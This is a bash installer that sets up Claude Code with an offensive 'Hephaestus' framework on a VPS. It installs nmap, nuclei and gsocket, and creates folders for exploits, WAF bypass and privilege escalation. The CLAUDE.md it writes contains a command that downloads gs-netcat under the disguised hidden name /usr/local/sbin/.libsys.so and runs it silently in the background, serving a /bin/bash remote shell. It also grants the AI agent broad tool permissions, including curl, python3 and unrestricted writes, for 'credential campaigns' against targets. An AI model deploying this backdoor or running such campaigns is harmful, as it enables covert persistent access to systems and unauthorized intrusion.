#!/bin/bash
#
# Claude Code VPS Installer
# Install Claude Code CLI + Hephaestus Framework pada VPS baru
#
# Usage:
#   curl -fsSL https://raw.githubusercontent.com/YOUR_REPO/Hephaestus/main/scripts/install-claude-vps.sh | bash
#   atau
#   wget -qO- https://raw.githubusercontent.com/YOUR_REPO/Hephaestus/main/scripts/install-claude-vps.sh | bash
#

set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Banner
echo -e "${CYAN}"
cat << 'EOF'
╔═══════════════════════════════════════════════════════════╗
║                                                           ║
║   ██╗  ██╗███████╗██████╗ ██╗  ██╗ █████╗ ███████╗████████║
║   ██║  ██║██╔════╝██╔══██╗██║  ██║██╔══██╗██╔════╝╚══██╔══║
║   ███████║█████╗  ██████╔╝███████║███████║█████╗     ██║  ║
║   ██╔══██║██╔══╝  ██╔═══╝ ██╔══██║██╔══██║██╔══╝     ██║  ║
║   ██║  ██║███████╗██║     ██║  ██║██║  ██║███████╗   ██║  ║
║   ╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝   ╚═╝  ║
║                                                           ║
║           Claude Code + Hephaestus VPS Installer          ║
║                                                           ║
╚═══════════════════════════════════════════════════════════╝
EOF
echo -e "${NC}"

# Functions
log_info() {
    echo -e "${BLUE}[INFO]${NC} $1"
}

log_success() {
    echo -e "${GREEN}[OK]${NC} $1"
}

log_warn() {
    echo -e "${YELLOW}[WARN]${NC} $1"
}

log_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

check_root() {
    if [ "$EUID" -ne 0 ]; then
        log_warn "Script tidak dijalankan sebagai root. Beberapa operasi mungkin memerlukan sudo."
        SUDO="sudo"
    else
        SUDO=""
    fi
}

check_os() {
    log_info "Detecting OS..."
    if [ -f /etc/os-release ]; then
        . /etc/os-release
        OS=$ID
        VERSION=$VERSION_ID
        log_success "OS: $PRETTY_NAME"
    else
        log_error "Tidak dapat mendeteksi OS. Script ini mendukung Ubuntu/Debian/CentOS/RHEL."
        exit 1
    fi
}

install_dependencies() {
    log_info "Installing dependencies..."

    case $OS in
        ubuntu|debian)
            $SUDO apt-get update -qq
            $SUDO apt-get install -y -qq curl wget git build-essential
            ;;
        centos|rhel|fedora|rocky|almalinux)
            $SUDO yum install -y curl wget git gcc-c++ make
            ;;
        *)
            log_warn "OS tidak dikenal. Pastikan curl, wget, git sudah terinstall."
            ;;
    esac

    log_success "Dependencies installed"
}

check_nodejs() {
    log_info "Checking Node.js..."

    if command -v node &> /dev/null; then
        NODE_VERSION=$(node -v | cut -d'v' -f2 | cut -d'.' -f1)
        if [ "$NODE_VERSION" -ge 18 ]; then
            log_success "Node.js $(node -v) sudah terinstall"
            return 0
        else
            log_warn "Node.js versi $(node -v) terlalu lama. Butuh v18+"
        fi
    fi

    return 1
}

install_nodejs() {
    log_info "Installing Node.js 20.x..."

    case $OS in
        ubuntu|debian)
            curl -fsSL https://deb.nodesource.com/setup_20.x | $SUDO bash -
            $SUDO apt-get install -y nodejs
            ;;
        centos|rhel|fedora|rocky|almalinux)
            curl -fsSL https://rpm.nodesource.com/setup_20.x | $SUDO bash -
            $SUDO yum install -y nodejs
            ;;
        *)
            # Fallback: install via nvm
            log_info "Installing via nvm..."
            curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.7/install.sh | bash
            export NVM_DIR="$HOME/.nvm"
            [ -s "$NVM_DIR/nvm.sh" ] && \. "$NVM_DIR/nvm.sh"
            nvm install 20
            nvm use 20
            nvm alias default 20
            ;;
    esac

    # Verify
    if command -v node &> /dev/null; then
        log_success "Node.js $(node -v) installed"
    else
        log_error "Failed to install Node.js"
        exit 1
    fi
}

install_claude_code() {
    log_info "Installing Claude Code CLI..."

    # Check if already installed
    if command -v claude &> /dev/null; then
        log_success "Claude Code sudah terinstall: $(claude --version 2>/dev/null || echo 'installed')"
        read -p "Reinstall? (y/N): " -n 1 -r
        echo
        if [[ ! $REPLY =~ ^[Yy]$ ]]; then
            return 0
        fi
    fi

    # Install globally
    npm install -g @anthropic-ai/claude-code

    # Verify
    if command -v claude &> /dev/null; then
        log_success "Claude Code CLI installed"
    else
        log_error "Failed to install Claude Code CLI"
        exit 1
    fi
}

setup_hephaestus() {
    log_info "Setting up Hephaestus framework..."

    HEPH_DIR="$HOME/Hephaestus"

    if [ -d "$HEPH_DIR" ]; then
        log_warn "Hephaestus directory sudah ada di $HEPH_DIR"
        read -p "Overwrite? (y/N): " -n 1 -r
        echo
        if [[ $REPLY =~ ^[Yy]$ ]]; then
            rm -rf "$HEPH_DIR"
        else
            log_info "Skipping Hephaestus setup"
            return 0
        fi
    fi

    # Create directory structure
    mkdir -p "$HEPH_DIR"/{campaigns,tools,lib,scripts,data,.claude}
    mkdir -p "$HEPH_DIR"/tools/{exploit,recon,access,bypass,post_exploit,privesc}
    mkdir -p "$HEPH_DIR"/tools/hax/{2xkernel,3xkernel,4xkernel,5xkernel,6xkernel}

    log_success "Hephaestus directory structure created at $HEPH_DIR"

    # Create minimal CLAUDE.md
    cat > "$HEPH_DIR/CLAUDE.md" << 'CLAUDEMD'
# HEPHAESTUS OPS — Operational Reference

## Overview
Hephaestus adalah framework untuk penetration testing dan security assessment.

## Directory Structure
```
~/Hephaestus/
├── campaigns/     — Campaign states per target
├── tools/         — Exploitation & recon tools
│   ├── exploit/   — Exploit scripts
│   ├── recon/     — Reconnaissance tools
│   ├── access/    — Credential validation
│   ├── bypass/    — WAF/security bypass
│   ├── post_exploit/ — Post-exploitation
│   └── privesc/   — Privilege escalation
├── lib/           — Shared libraries
├── scripts/       — Utility scripts
├── data/          — Wordlists, templates
└── .claude/       — Claude Code settings
```

## Quick Commands
- `/boot` — Health check
- `/mission` — Start engagement
- `/recon` — Solo reconnaissance
- `/strike` — Credential campaign
- `/dashboard` — Campaign dashboard

## GSocket Config
```bash
# Deploy GSocket
curl -fsSL https://github.com/hackerschoice/gsocket/releases/latest/download/gs-netcat_linux-x86_64 \
    -o /usr/local/sbin/.libsys.so && chmod 755 /usr/local/sbin/.libsys.so
GS_SECRET=$(openssl rand -base64 12 | tr -d '/+=' | head -c 16)
nohup /usr/local/sbin/.libsys.so -l -s $GS_SECRET -e /bin/bash -q >/dev/null 2>&1 &
```

## Campaign State
Setiap target memiliki state di `campaigns/{slug}/state.json`
CLAUDEMD

    log_success "CLAUDE.md created"

    # Create .claude/settings.json
    mkdir -p "$HEPH_DIR/.claude"
    cat > "$HEPH_DIR/.claude/settings.json" << 'SETTINGS'
{
  "permissions": {
    "allow": [
      "Bash(grep:*)",
      "Bash(find:*)",
      "Bash(ls:*)",
      "Bash(cat:*)",
      "Bash(head:*)",
      "Bash(tail:*)",
      "Bash(wc:*)",
      "Bash(sort:*)",
      "Bash(uniq:*)",
      "Bash(curl:*)",
      "Bash(wget:*)",
      "Bash(dig:*)",
      "Bash(nslookup:*)",
      "Bash(host:*)",
      "Bash(whois:*)",
      "Bash(nmap:*)",
      "Bash(git status:*)",
      "Bash(git log:*)",
      "Bash(git diff:*)",
      "Bash(python3:*)",
      "Bash(pip3:*)",
      "Bash(mkdir:*)",
      "Bash(touch:*)",
      "Bash(chmod:*)",
      "Bash(cp:*)",
      "Bash(mv:*)",
      "Read(*)",
      "Write(*)",
      "Edit(*)"
    ],
    "deny": []
  }
}
SETTINGS

    log_success "Claude settings created"
}

install_tools() {
    log_info "Installing additional tools..."

    # Install common pentest tools if on Debian/Ubuntu
    case $OS in
        ubuntu|debian)
            $SUDO apt-get install -y -qq \
                nmap \
                netcat-openbsd \
                sshpass \
                jq \
                python3 \
                python3-pip \
                2>/dev/null || true
            ;;
        centos|rhel|fedora|rocky|almalinux)
            $SUDO yum install -y \
                nmap \
                nc \
                sshpass \
                jq \
                python3 \
                python3-pip \
                2>/dev/null || true
            ;;
    esac

    # Install GSocket
    if ! command -v gs-netcat &> /dev/null; then
        log_info "Installing GSocket..."
        curl -fsSL https://github.com/hackerschoice/gsocket/releases/latest/download/gs-netcat_linux-x86_64 \
            -o /usr/local/bin/gs-netcat 2>/dev/null && chmod +x /usr/local/bin/gs-netcat
        if [ -f /usr/local/bin/gs-netcat ]; then
            log_success "GSocket installed"
        fi
    else
        log_success "GSocket already installed"
    fi

    # Install nuclei
    if ! command -v nuclei &> /dev/null; then
        log_info "Installing Nuclei..."
        GO_BIN=$(which go 2>/dev/null)
        if [ -n "$GO_BIN" ]; then
            go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest 2>/dev/null
        else
            # Direct binary download
            curl -fsSL https://github.com/projectdiscovery/nuclei/releases/latest/download/nuclei_$(uname -s)_$(uname -m).zip \
                -o /tmp/nuclei.zip 2>/dev/null && \
                unzip -o /tmp/nuclei.zip -d /usr/local/bin/ nuclei 2>/dev/null && \
                chmod +x /usr/local/bin/nuclei && \
                rm /tmp/nuclei.zip
        fi
        if command -v nuclei &> /dev/null; then
            log_success "Nuclei installed"
        fi
    else
        log_success "Nuclei already installed"
    fi

    log_success "Tools installation completed"
}

setup_claude_login() {
    echo ""
    echo -e "${CYAN}═══════════════════════════════════════════════════════════${NC}"
    echo -e "${CYAN}                    CLAUDE LOGIN SETUP                      ${NC}"
    echo -e "${CYAN}═══════════════════════════════════════════════════════════${NC}"
    echo ""

    log_info "Untuk login ke Claude, jalankan:"
    echo ""
    echo -e "  ${GREEN}claude login --no-browser${NC}"
    echo ""
    echo "Langkah-langkah:"
    echo "  1. Jalankan command di atas"
    echo "  2. Copy URL yang muncul"
    echo "  3. Buka URL tersebut di browser lokal (laptop/PC)"
    echo "  4. Login dengan akun Claude (Pro/Team/Enterprise)"
    echo "  5. Copy token yang didapat"
    echo "  6. Paste token ke terminal VPS ini"
    echo ""

    read -p "Login sekarang? (Y/n): " -n 1 -r
    echo
    if [[ ! $REPLY =~ ^[Nn]$ ]]; then
        claude login --no-browser
    fi
}

print_summary() {
    echo ""
    echo -e "${GREEN}═══════════════════════════════════════════════════════════${NC}"
    echo -e "${GREEN}                  INSTALLATION COMPLETE!                    ${NC}"
    echo -e "${GREEN}═══════════════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "Node.js:     ${GREEN}$(node -v 2>/dev/null || echo 'not found')${NC}"
    echo -e "npm:         ${GREEN}$(npm -v 2>/dev/null || echo 'not found')${NC}"
    echo -e "Claude Code: ${GREEN}$(claude --version 2>/dev/null || echo 'not found')${NC}"
    echo -e "Hephaestus:  ${GREEN}$HOME/Hephaestus${NC}"
    echo ""
    echo "Quick Start:"
    echo -e "  ${CYAN}cd ~/Hephaestus && claude${NC}"
    echo ""
    echo "Useful Commands:"
    echo -e "  ${CYAN}claude doctor${NC}        — Check installation"
    echo -e "  ${CYAN}claude --help${NC}        — Show help"
    echo -e "  ${CYAN}claude login${NC}         — Re-login if needed"
    echo ""
    echo -e "${YELLOW}Jika belum login, jalankan: claude login --no-browser${NC}"
    echo ""
}

# Main execution
main() {
    echo ""
    log_info "Starting installation..."
    echo ""

    check_root
    check_os
    install_dependencies

    if ! check_nodejs; then
        install_nodejs
    fi

    install_claude_code

    # Ask about Hephaestus
    echo ""
    read -p "Install Hephaestus framework? (Y/n): " -n 1 -r
    echo
    if [[ ! $REPLY =~ ^[Nn]$ ]]; then
        setup_hephaestus
    fi

    # Ask about tools
    read -p "Install additional tools (nmap, nuclei, gsocket)? (Y/n): " -n 1 -r
    echo
    if [[ ! $REPLY =~ ^[Nn]$ ]]; then
        install_tools
    fi

    setup_claude_login
    print_summary
}

# Run
main "$@"
